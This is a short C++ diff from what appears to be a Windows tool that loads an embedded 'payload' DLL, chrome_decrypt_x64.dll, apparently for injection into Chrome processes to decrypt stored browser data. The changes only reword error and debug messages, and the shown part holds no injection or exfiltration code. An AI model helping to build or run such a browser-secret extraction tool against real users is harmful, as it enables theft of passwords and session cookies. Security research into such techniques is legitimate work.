@@ -315,27 +315,28 @@ std::optional<DWORD> GetProcessIdByName(const std::wstring &procName)
 
 std::vector<BYTE> GetPayloadDllData()
 {
+    debug("Attempting to load resource: CHROME_DECRYPT_DLL");
     HRSRC hRes = FindResourceA(NULL, CHROME_DECRYPT_DLL, RT_RCDATA);
     if (!hRes) {
-        print_status("[-]", "FindResourceA failed. Error: " + std::to_string(GetLastError()));
+        print_status("[-]", "FindResourceA failed for CHROME_DECRYPT_DLL. Error: " + std::to_string(GetLastError()));
         return {};
     }
 
     HGLOBAL hResData = LoadResource(NULL, hRes);
     if (!hResData) {
-        print_status("[-]", "LoadResource failed. Error: " + std::to_string(GetLastError()));
+        print_status("[-]", "LoadResource failed for CHROME_DECRYPT_DLL. Error: " + std::to_string(GetLastError()));
         return {};
     }
 
     BYTE* dllData = (BYTE*)LockResource(hResData);
     SIZE_T dllSize = SizeofResource(NULL, hRes);
     if (!dllData || dllSize == 0) {
-        print_status("[-]", "LockResource failed or size is 0. Error: " + std::to_string(GetLastError()));
+        print_status("[-]", "LockResource failed or size is 0 for CHROME_DECRYPT_DLL. Error: " + std::to_string(GetLastError()));
         return {};
     }
 
     std::vector<BYTE> dllBuffer(dllData, dllData + dllSize);
-    debug("GetPayloadDllData: Loaded DLL from resource. Size: " + std::to_string(dllSize) + " bytes");
+    debug("GetPayloadDllData: Loaded chrome_decrypt_x64.dll from resource. Size: " + std::to_string(dllSize) + " bytes");
     return dllBuffer;
 }
 
@@ -752,7 +753,7 @@ int wmain(int argc, wchar_t *argv[])
     std::vector<BYTE> dllBuffer = GetPayloadDllData();
     if (dllBuffer.empty())
     {
-        print_status("[-]", "Failed to load chrome_decrypt.dll from resource.");
+        print_status("[-]", "Failed to load chrome_decrypt_x64.dll from resource.");
         return 1;
     }
 
